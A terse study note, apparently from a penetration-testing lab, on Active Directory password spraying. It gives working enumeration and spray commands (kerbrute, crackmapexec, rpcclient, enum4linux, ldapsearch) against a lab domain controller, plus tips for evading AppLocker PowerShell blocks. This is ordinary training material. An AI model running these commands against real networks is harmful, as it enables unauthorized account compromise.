# password spraying

how to get info about users:
* SMB null 
* LDAP anonymous bind to query LDAP anonymously
* tool such as Kerbrute to validate users utilizing a word list from:
  * https://github.com/insidetrust/statistically-likely-usernames
  * https://github.com/initstring/linkedin2username
  * `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt `
* LLMNR/NBT-NS response poisoning using Responder

we can also get info about passowrd policies thorugh 
* SMB null 
* LDAP anonymous bind to query LDAP anonymously

tools that can be used are:
* enum4linux  - `enum4linux -U 172.16.5.5`
* rpcclient - `rpcclient -U "" -N 172.16.5.5`
* CrackMapExec - `crackmapexec smb 172.16.5.5 --users`
* ldapsearch -  `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"`

## so lets spray

### kerbrute:
`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`

### crackmapexec
`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`
`sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`

> [!NOTE]
> what is a golden image?
> This meaning carried over into systems administration. In this context, a `golden image` is an intentionally configured snapshot of a system, (server, virtual desktop environment, or even a disk drive) which can be used to deploy new instances. Because this `golden image` (or sometimes gold image) is used in network virtualization to create new systems, it is also called a `master image` or `clone image`. Another popular term is a `baseline image`, which can be an illustrative term to frame why `golden images` are so useful:\
>  they create a consistent, reliable baseline for system configuration, which can make it easier to maintain those systems across their life cycle.


## security controls

* microsoft defender - by default will block `power view`
* applocker
```
It is common for organizations to block cmd.exe and PowerShell.exe and writeaccess to certain directories, but this can all be bypassed. Organizationsalso often focus on blocking the PowerShell.exe executable, but forget aboutthe other PowerShell executable locations such as%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe orPowerShell_ISE.exe
```
* 